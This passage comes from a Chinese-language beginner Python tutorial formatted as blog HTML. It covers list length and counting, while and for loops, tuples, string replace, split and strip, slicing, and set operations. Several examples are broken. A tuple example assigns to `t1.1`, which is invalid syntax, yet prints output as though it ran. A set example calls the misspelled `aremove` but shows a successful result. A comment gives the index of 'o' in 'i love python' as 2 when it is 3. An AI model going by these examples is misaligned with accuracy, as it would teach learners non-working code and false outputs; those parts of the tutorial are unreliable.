class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(names)) <span class="comment"># 4  （说明 names 列表内有 4 个元素）</span></span><br></pre></td></tr></table></figure><h3 id="列表内重复元素数量统计（-count）"><a href="#列表内重复元素数量统计（-count）" class="headerlink" title="列表内重复元素数量统计（.count）"></a><span style="font-size: 24px; font-weight: bold;"><a id="count-list"></a>列表内重复元素数量统计（.count）</span><br></h3><p>功能：统计列表内指定元素的数量<br><br>语法：<code>列表.count(元素)</code><br><br>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>,<span class="string">&quot;张三&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(names.count(<span class="string">&quot;张三&quot;</span>)) <span class="comment"># 2  （说明 names 里面有两个 &quot;张三&quot;）</span></span><br></pre></td></tr></table></figure><h3 id="列表的遍历"><a href="#列表的遍历" class="headerlink" title="列表的遍历"></a>列表的遍历</h3><h4 id="while循环遍历"><a href="#while循环遍历" class="headerlink" title="while循环遍历"></a><span style="font-size: 24px; font-weight: bold;"><code>while循环</code>遍历</span><br></h4><p>既然数据容器可以存储多个元素，那么，就会有需求从容器内依次取出元素进行操作<br><br>将容器内的元素依次取出进行处理的行为，称之为：遍历、迭代<br><br>如何遍历列表的元素呢？<br></p><ul><li>可以使用<code>while循环</code></li></ul><p>如何在循环中取出列表的元素呢？<br></p><ul><li>使用列表<code>[下标]</code>的方式取出</li></ul><p>循环条件如何控制？<br></p><ul><li>定义一个变量表示下标，从<code>0</code>开始</li><li>循环条件为 下标值<code>&lt;</code>列表的元素数量</li></ul><p>下面是示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(names[i])     <span class="comment"># 遍历names列表的0~3数据</span></span><br><span class="line">    i = i+<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="for循环遍历"><a href="#for循环遍历" class="headerlink" title="for循环遍历"></a><span style="font-size: 24px; font-weight: bold;"><code>for循环</code>遍历</span><br></h4><p>相比较于<code>while循环</code>来说，<code>for循环</code>完成该工作的效果更好，因为从<code>for循环</code>的基础结构中可以看出，是<a href="#for%E5%BE%AA%E7%8E%AF">对每一项中的数据进行调出</a>的，更加适合<code>遍历</code>操作<br><br>下面是示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><blockquote><p>明显的，完成同样遍历任务，<code>for循环</code>代码量小于<code>while循环</code></p></blockquote><h1 id="数据容器：tuple（元组）"><a href="#数据容器：tuple（元组）" class="headerlink" title="数据容器：tuple（元组）"></a><span style="font-size: 24px; font-weight: bold;">数据容器：tuple（元组）</span><br></h1><p><code>元组</code>和<code>列表</code>一样，都可以封装多个不同类型的元素，但也有区别：<br></p><ul><li><code>元组</code>内的元素是<code>不可修改</code>的<blockquote><p>所以，当我们需要在程序内封装数据，又不希望封装的数据被篡改，那么元组就非常合适了<br><br>例如：某人的身份证号码、银行卡号、手机号之类的数据</p></blockquote></li></ul><h3 id="定义元组"><a href="#定义元组" class="headerlink" title="定义元组"></a><span style="font-size: 24px; font-weight: bold;">定义元组</span><br></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义元组</span></span><br><span class="line">(元素<span class="number">1</span>,元素<span class="number">2</span>,元素<span class="number">3</span>,元素<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义元组变量</span></span><br><span class="line">变量名 = (元素<span class="number">1</span>,元素<span class="number">2</span>,元素<span class="number">3</span>,元素<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义空元组</span></span><br><span class="line">变量名 = ()</span><br><span class="line">变量名 = <span class="built_in">tuple</span>()    <span class="comment"># 面向对象的写法</span></span><br></pre></td></tr></table></figure><p>注意！<br><br>定义单个元素的元组时，要在元素后面加上<code>,</code> 否则无法识别出元组<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t1 = (<span class="string">&quot;python&quot;</span>)</span><br><span class="line">t1<span class="number">.1</span> = (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t2 = (<span class="string">&quot;python&quot;</span>,)</span><br><span class="line">t2<span class="number">.2</span> = (<span class="number">1</span>,)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t1<span class="number">.1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t2<span class="number">.2</span>))</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&lt;class &#x27;tuple&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&lt;class &#x27;int&#x27;&gt;</span><br><span class="line">&lt;class &#x27;tuple&#x27;&gt;</span><br></pre></td></tr></table></figure><p>可以看到，如果不加<code>,</code>系统不会将其视为元组，而是视为原本的数据类型<br></p><h3 id="元组的运用与相关操作"><a href="#元组的运用与相关操作" class="headerlink" title="元组的运用与相关操作"></a><span style="font-size: 24px; font-weight: bold;">元组的运用与相关操作</span><br></h3><p><span style="font-size: 20px; font-weight: bold;"><code>元组</code>和<code>列表</code>的语法基本相同，可以参考上文关于列表的部分，在此做出引用：</span><br></p><blockquote><p>元组运用：<a href="#%E5%88%97%E8%A1%A8%E7%9A%84%E4%B8%8B%E6%A0%87%E7%B4%A2%E5%BC%95">元组索引</a>、<a href="#%E5%88%97%E8%A1%A8%E7%9A%84%E9%81%8D%E5%8E%86">元组的遍历</a>、<a href="#%E5%B5%8C%E5%A5%97%E5%88%97%E8%A1%A8%E7%9A%84%E4%B8%8B%E6%A0%87%E7%B4%A2%E5%BC%95">元组的嵌套</a><br><br>相关操作：<a href="#len-list">元组的长度统计（len）</a>、<a href="#count-list">元组内重复元素数量统计（.count）</a>、<a href="#index-list">元组的查询功能（.index）</a></p></blockquote><p>上面我们提到，元组无法进行修改操作，但是在<code>元组内嵌套列表</code>的情况下是可以的<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t1 = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>])      <span class="comment"># 创建一个带列表的元组</span></span><br><span class="line">t1[<span class="number">3</span>][<span class="number">0</span>] = <span class="string">&quot;A&quot;</span>                  <span class="comment"># 修改元组内嵌套列表的元素</span></span><br><span class="line"><span class="built_in">print</span>(t1)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1, 2, 3, [&#x27;A&#x27;, &#x27;b&#x27;, &#x27;c&#x27;])</span><br></pre></td></tr></table></figure><p>可以看到，元组内嵌套的列表的元素是可以被修改的，<span style="color:red">这也是元组内唯一的可更改的操作</span></p><h1 id="数据容器：str（字符串）"><a href="#数据容器：str（字符串）" class="headerlink" title="数据容器：str（字符串）"></a><span style="font-size: 24px; font-weight: bold;">数据容器：str（字符串）</span><br></h1><p>尽管字符串看起来并不像：列表、元组那样，一看就是存放了许多数据的容器<br><br>但不可否认的是，字符串同样也是数据容器的一员。<br><br>字符串是字符的容器，一个字符串可以存放任意数量的字符<br><br>如字符串：<code>&quot;python&quot;</code><br><br><img src="https://free.picui.cn/free/2025/06/19/685375d1e6fe7.png" alt="字符串列表示意图"></p><h2 id="字符串的运用与相关操作"><a href="#字符串的运用与相关操作" class="headerlink" title="字符串的运用与相关操作"></a><span style="font-size: 24px; font-weight: bold;">字符串的运用与相关操作</span><br></h2><h3 id="字符串的一般运用操作"><a href="#字符串的一般运用操作" class="headerlink" title="字符串的一般运用操作"></a><span style="font-size: 24px; font-weight: bold;">字符串的一般运用操作</span><br></h3><p><code>字符串</code>和<code>列表</code>的语法基本相同，可以参考上文关于列表的部分，在此做出引用：<br></p><blockquote><p>字符串的运用：<a href="#%E5%88%97%E8%A1%A8%E7%9A%84%E4%B8%8B%E6%A0%87%E7%B4%A2%E5%BC%95">字符串索引</a>、<a href="#%E5%88%97%E8%A1%A8%E7%9A%84%E9%81%8D%E5%8E%86">字符串的遍历</a><br><br>相关操作：<a href="#len-list">字符串的长度统计（len）</a>、<a href="#count-list">字符串内重复元素数量统计（.count）</a>、<a href="#index-list">字符串的查询功能（.index）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&quot;i love python&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(word))        <span class="comment"># 13 （说明 word 字符串有13个字符）</span></span><br><span class="line"><span class="built_in">print</span>(word.index(<span class="string">&quot;o&quot;</span>))  <span class="comment"># 2  （说明 &quot;o&quot; 在 word 字符串的下标为2）</span></span><br><span class="line"><span class="built_in">print</span>(word.count(<span class="string">&quot;o&quot;</span>))  <span class="comment"># 2  （说明 word 字符串内有2个 &quot;o&quot;）</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="字符串的特殊操作"><a href="#字符串的特殊操作" class="headerlink" title="字符串的特殊操作"></a><span style="font-size: 24px; font-weight: bold;">字符串的特殊操作</span><br></h3><p><img src="https://free.picui.cn/free/2025/06/19/6853ae30b5f81.png" alt="字符串操作"></p><h4 id="字符串的替换"><a href="#字符串的替换" class="headerlink" title="字符串的替换"></a><span style="font-size: 20px; font-weight: bold;">字符串的替换</span><br></h4><p>语法：<code>字符串.replace(字符串1,字符串2)</code><br><br>功能：将<code>字符串1</code>的内容替换为<code>字符串2</code>的内容<br><br>注意：<span style="color:red"><code>字符串.replace</code>的操作不会改变原字符串，而是返回一个新的字符串</span><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&quot;i love python&quot;</span></span><br><span class="line">new_word = word.replace(<span class="string">&quot;love&quot;</span>,<span class="string">&quot;hate&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(word)</span><br><span class="line"><span class="built_in">print</span>(new_word)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i love python</span><br><span class="line">i hate python</span><br></pre></td></tr></table></figure><p>可以看到，<code>word</code>字符串内的内容并没有改变，只是返回了一个新的字符串<br></p><h4 id="字符串的分割（-split）"><a href="#字符串的分割（-split）" class="headerlink" title="字符串的分割（.split）"></a><span style="font-size: 20px; font-weight: bold;">字符串的分割（.split）</span><br></h4><p>语法：<code>字符串.split(分割字符串)</code><br><br>功能：将<code>分割字符串</code>的内容作为分隔符，对<code>字符串</code>进行分割，并存入<code>列表对象</code>中<br><br>注意：<span style="color:red"><code>字符串.split</code>的操作不会改变原字符串，而是返回一个新的<code>列表对象</code></span><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&quot;i love python&quot;</span></span><br><span class="line">my_list = word.split(<span class="string">&quot; &quot;</span>)      <span class="comment"># 按照空格分割</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;原字符串：<span class="subst">&#123;word&#125;</span>，分割后的列表：<span class="subst">&#123;my_list&#125;</span>，格式为<span class="subst">&#123;<span class="built_in">type</span>(my_list)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原字符串：i love python，分割后的列表：[&#x27;i&#x27;, &#x27;love&#x27;, &#x27;python&#x27;]，格式为&lt;class &#x27;list&#x27;&gt;</span><br></pre></td></tr></table></figure><h4 id="字符串的规整（-strip）"><a href="#字符串的规整（-strip）" class="headerlink" title="字符串的规整（.strip）"></a><span style="font-size: 20px; font-weight: bold;">字符串的规整（.strip）</span><br></h4><p>这一部分比较抽象，建议看一下B站的视频，这里是转跳链接：<a href="https://www.bilibili.com/video/BV1qW4y1a7fU/?p=69&share_source=copy_web&vd_source=76ef81a3c7f598cf017a43cc75c2cf93&t=682">视频链接</a><br><br>语法：<code>字符串.strip()</code>、<code>字符串.strip(去除前后指定字符串)</code><br><br>功能：将<code>字符串</code>首尾的空格、换行符等去掉<br><br>注意：<span style="color:red"><code>字符串.strip</code>的操作不会改变原字符串，而是返回一个新的字符串</span><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&quot;    i love python    &quot;</span></span><br><span class="line">new_word = word.strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;原字符串：<span class="subst">&#123;word&#125;</span>，去除首尾空格后的字符串：<span class="subst">&#123;new_word&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原字符串：    i love python    ，去除首尾空格后的字符串：i love python</span><br></pre></td></tr></table></figure><p>可以看到，<code>word</code>字符串内的内容并没有改变，只是返回了一个新的字符串<br></p><h1 id="数据容器（序列）的切片"><a href="#数据容器（序列）的切片" class="headerlink" title="数据容器（序列）的切片"></a>数据容器（序列）的切片</h1><h2 id="序列的定义"><a href="#序列的定义" class="headerlink" title="序列的定义"></a><span style="font-size: 20px; font-weight: bold;">序列的定义</span><br></h2><p>序列是指：内容连续、有序，可使用下标索引的一类数据容器<br><br>列表、元组、字符串，均可以可以视为序列。</p><h2 id="序列的切片"><a href="#序列的切片" class="headerlink" title="序列的切片"></a><span style="font-size: 20px; font-weight: bold;">序列的切片</span><br></h2><p>作用：从一个序列中，取出一个新的序列<br><br>语法：<code>序列[开始索引:结束索引:步长]</code><br><br><span style="color:red">表示从序列中，从指定位置开始，依次取出元素，到指定位置结束，得到一个新序列:</span><br></p><ul><li>起始下标表示从何处开始，可以留空，留空视作从头开始</li><li>结束下标(不含)表示何处结束，可以留空，留空视作截取到结尾</li><li>步长表示，依次取元素的间隔<ul><li>步长1表示，一个个取元素</li><li>步长2表示，每次跳过1个元素取</li><li>步长N表示，每次跳过N-1个元素取</li><li>步长为负数表示，反向取(注意，起始下标和结束下标也要反向标记)</li></ul></li></ul><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">b = a[<span class="number">0</span>:<span class="number">5</span>:<span class="number">2</span>]    <span class="comment"># 从 0号元素 开始取到 5号元素 ，步长为 2</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0, 2, 4]</span><br></pre></td></tr></table></figure><h1 id="数据容器：set（集合）"><a href="#数据容器：set（集合）" class="headerlink" title="数据容器：set（集合）"></a>数据容器：set（集合）</h1><p>之前我们学习的<code>列表</code>、<code>元组</code>、<code>字符串</code>都是有序的，支持重复元素<br><br>但是<code>集合</code>中的元素是无序的，且不支持重复元素（自动去重）<br></p><h2 id="集合定义"><a href="#集合定义" class="headerlink" title="集合定义"></a><span style="font-size: 20px; font-weight: bold;">集合定义</span><br></h2><p>语法：<code>&#123;元素1，元素2，……&#125;</code><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义集合字面量</span></span><br><span class="line">&#123;元素,元素,元素,……&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义集合变量</span></span><br><span class="line">变量名称 = &#123;元素,元素,元素,……&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义空集合</span></span><br><span class="line">变量名称 = <span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>下面我们来验证<code>集合</code>的<code>自动去重</code>和<code>无需性</code>：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my_set = &#123;<span class="string">&quot;I&quot;</span>,<span class="string">&quot;love&quot;</span>,<span class="string">&quot;Python&quot;</span>,<span class="string">&quot;I&quot;</span>,<span class="string">&quot;love&quot;</span>,<span class="string">&quot;Python&quot;</span>,<span class="string">&quot;I&quot;</span>,<span class="string">&quot;love&quot;</span>,<span class="string">&quot;Python&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;my_set中的内容是：<span class="subst">&#123;my_set&#125;</span>,它的类型是：<span class="subst">&#123;<span class="built_in">type</span>(my_set)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_set中的内容是：&#123;&#x27;love&#x27;, &#x27;Python&#x27;, &#x27;I&#x27;&#125;,它的类型是：&lt;class &#x27;set&#x27;&gt;</span><br></pre></td></tr></table></figure><p>可以明显的看到，输出集合内容的时候，把重复的<code>I</code>、<code>love</code>、<code>Python</code>去掉了，并且最后输出是无序的<br></p><blockquote><p>注意注意！<span style="color:red">集合是无序的，所以无法使用下标来访问集合中的元素</span></p></blockquote><h2 id="集合的基础操作"><a href="#集合的基础操作" class="headerlink" title="集合的基础操作"></a><span style="font-size: 24px; font-weight: bold;">集合的基础操作</span><br></h2><p>集合的操作包括：<code>添加</code>、<code>删除</code>、<code>随机取出</code></p><h3 id="添加（-add）"><a href="#添加（-add）" class="headerlink" title="添加（.add）"></a><span style="font-size: 24px; font-weight: bold;">添加（.add）</span><br></h3><p>语法：<code>变量名.add(元素)</code><br><br>下面是是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line">my_set.add(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;1, 2, 3&#125;</span><br><span class="line">&#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure><p>成功的将元素<code>4</code>添加到集合中<br></p><h3 id="删除（-remove）"><a href="#删除（-remove）" class="headerlink" title="删除（.remove）"></a><span style="font-size: 24px; font-weight: bold;">删除（.remove）</span><br></h3><p>语法：<code>变量名.remove(元素)</code><br><br>下面是是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line">my_set.aremove(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;1, 2, 3&#125;</span><br><span class="line">&#123;1, 2&#125;</span><br></pre></td></tr></table></figure><p>成功的将元素<code>3</code>从集合中删除<br></p><h3 id="随机取出（-pop）"><a href="#随机取出（-pop）" class="headerlink" title="随机取出（.pop）"></a><span style="font-size: 24px; font-weight: bold;">随机取出（.pop）</span><br></h3><p>好熟悉的<code>.pop</code>，在之前学<code>列表</code>的时候提到过【<a href="#pop_list">点击转跳</a>】，但是在<code>集合</code>中，由于无法指定下标来取出元素，<span style="color:red"><code>.pop</code>就会随机取出一个元素，<strong>同时在原本的集合中，取出的元素也会被删除</strong></span><br><br>语法：<code>变量名.pop()</code><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_set.pop())</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">&#123;1, 3&#125;</span><br></pre></td></tr></table></figure><p>可以看到，随机取出了集合中的元素<code>2</code>（当然也可能是<code>1</code>或<code>3</code>）</p><h3 id="清除（-clear）"><a href="#清除（-clear）" class="headerlink" title="清除（.clear）"></a><span style="font-size: 24px; font-weight: bold;">清除（.clear）</span><br></h3><p>哇，这个<code>.clear</code>更熟悉了，依旧在之前学<code>列表</code>的时候提到过【<a href="#clear_list">点击转跳</a>】，甚至连语法和功能都完全相同<br><br>语法：<code>集合.clear()</code><br><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line">my_set.clear()</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;1, 2, 3&#125;</span><br><span class="line">set()</span><br></pre></td></tr></table></figure><p>可以看到，成功的将集合中的所有元素删除了，只剩下一个<code>空集合</code><br></p><h3 id="统计元素（len-）"><a href="#统计元素（len-）" class="headerlink" title="统计元素（len()）"></a><span style="font-size: 24px; font-weight: bold;">统计元素（len()）</span><br></h3><p>好好好，又是老朋友，不多说了，看列表的吧！【<a href="#%E5%88%97%E8%A1%A8%E5%86%85%E5%85%83%E7%B4%A0%E6%95%B0%E9%87%8F%E7%BB%9F%E8%AE%A1len">点击跳转</a>】</p><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a><span style="font-size: 24px; font-weight: bold;">遍历</span><br></h3><p>因为<code>集合</code>无法使用下标的特殊性，所以不可以用<code>while循环</code>遍历，只能用<code>for循环</code><br><br>下面是代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_set:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>会随机但是完整的<code>print</code>出<code>my_set</code>中的所有元素</p><h3 id="集合的运算"><a href="#集合的运算" class="headerlink" title="集合的运算"></a><span style="font-size: 24px; font-weight: bold;">集合的运算</span><br></h3><p>首先，我们先要认识到，<code>集合set</code>就是数学中的集合，所以数学中集合的运算方式也适用于这里的集合运算<br><br><img src="https://free.picui.cn/free/2025/06/19/6853c16f130a8.png" alt="集合图"></p><ul><li>交集 ∩<ul><li>A∩B，表现在图中黄色区域</li></ul></li><li>并集 ∪<ul><li>A∪B，表现在图中绿色区域</li></ul></li><li>差集 -<ul><li>A-B，表现在图中红色区域</li></ul></li></ul><h4 id="交集"><a href="#交集" class="headerlink" title="交集"></a><span style="font-size: 24px; font-weight: bold;">交集</span><br></h4><p>语法：<code>集合1.intersection(集合2)</code><br><br>功能：返回一个<code>新集合</code>，该集合包含<code>集合1</code>和<code>集合2</code>中的公共元素<br><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">set2 = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">set3 = set1.intersection(set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;2, 3&#125;</span><br></pre></td></tr></table></figure><h4 id="并集"><a href="#并集" class="headerlink" title="并集"></a><span style="font-size: 24px; font-weight: bold;">并集</span><br></h4><p>语法：<code>集合1.union(集合2)</code><br><br>功能：返回一个<code>新集合</code>，该集合包含<code>集合1</code>和<code>集合2</code>中的所有元素<br><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">set2 = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">set3 = set1.union(set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br></pre></td></tr></table></figure><p>输出结果如下：<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure><h4 id="差集"><a href="#差集" class="headerlink" title="差集"></a><span style="font-size: 24px; font-weight: bold;">差集</span><br></h4><p>语法：<code>集合1.difference(集合2)</code><br><br>功能：返回一个<code>新集合</code>，该集合包含<code>集合1</code>中所有不在<code>集合2</code>中的元素<br><br>下面是示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">set2 = &#123;<span class="number">2</span>,<span 